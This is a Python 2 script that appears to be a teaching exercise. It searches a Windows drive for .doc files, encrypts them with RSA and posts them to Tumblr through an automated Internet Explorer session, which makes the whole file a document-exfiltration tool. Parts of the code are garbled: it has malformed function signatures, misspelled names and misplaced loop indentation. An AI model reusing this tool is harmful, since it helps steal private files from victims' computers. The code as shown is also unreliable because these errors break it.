import win32com.client
import os
import fnmatch
import time
import random
import zlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "**********"
password = "****************"
public_key = ""

def waitForBrowser(browser):
	while browser.ReadyState != 4 and browser.ReadyState != 'complete':
		time.sleep(0.5)
	return

def encryptString(plainText):
	chunk_size = 256
	print "Compressing: %d bytes" %len(plainText)
	plainText = zlib.compress(plainText)
	print "Encrypting: %d bytes" %len(plainText)
	rsaKey = RSA.importKey(public_key)
	rsaKey = PKCS1_OAEP.new(rsaKey)
	encrypted = ""
	offset = 0
	while offset &lt; len(plainText):
		chunk = plainText[offset:offset+chunk_size]
		if len(chunk)%chunk_size != 0:
			chunk += ""*(chunk_size-len(chunk))
			encrypted += rsaKey.encrypt(chunk)
			offset += chunk_size
			encrypted = encrypted.encode("base64")
		print "Base64 encoded crypto: %d" % len(encrypted)
	return encrypted

def encryptPost(filename):
	#open and read
	fd = open(filename, "rb")
	contents = fd.read()
	fd.close()
	encrypted_title = encryptString(filename)
	encrypted_body = encryptString(contents)
	return encrypted_title, encrypted_body


def randomSleep():
	time.sleep(random.randint(5,10))
	return

def loginToTumblr(ie):
	full_doc = ie.Document.all
	for i in full_doc:
		if i.id == "signup_email":
			i.setAttribute("value",username)
		elif i.id == "signup_password":
			i.setAttribute("value", password)
		randomSleep()
		try:

			if ie.Document.forms[0].id == "signup_form":
				ie.Document.forms[0].submit()
			else:
				ie.Document.forms[1].submit()
		except IndexError, e:
			pass
	randomSleep()
	waitForBrowser(ie)
	return

def postToTumblr(ie.title,post):
	full_doc = ie.Document.all
	for i in full_doc:
		if i.id == "post_one":
			i.setAttribute("value",title)
			title_box = i
			i.focus()
		elif i.id == "post_two":
			i.setAttribute("innerHTML",post)
			print "Set text area"
			i.focus()
		elif i.id == "create_post":
			print "Found post button"
			post_form = i 
			i.focus()
		#Move focus from the main content box
		randomSleep()
		title_box.focus
		#Post the form
		post_form.childeren[0].click()
		waitForBrowser(ie)
		randomSleep()
		return

def exfiltrate(document_path):
	ie = win32com.client.Dispatch("InternetExplorerApplication")
	ie.visible = 1

	#tumblr login
	ie.Navigate("https://www.tumblr.com/login")
	waitForBrowser(ie)
	print "Logging in ....."
	loginToTumblr(ie)
	print "Logged in ....navigating"
	ie.Navigate("https://www.tumblr.com/new/text")
	waitForBrowser(ie)
	#Encrypt the file
	title.body = encryptPost(document_path)
	print "Creating new post...."
	postToTumblr(ie,title,body)
	print "Posted!!"
	#Destroy IE instance
	ie.Quit()
	ie = None
	return

#Main loop for document discovery
for parent, directories, filenames in os.walk("C:\\"):
	for filename in fnmatch.filter(filenames, "%s" %doc_type):
		document_path = os.path.join(parent,filename)
		print "Found %s" %document_path
		exfiltrate(document_path)
		raw_input("Continue?ss")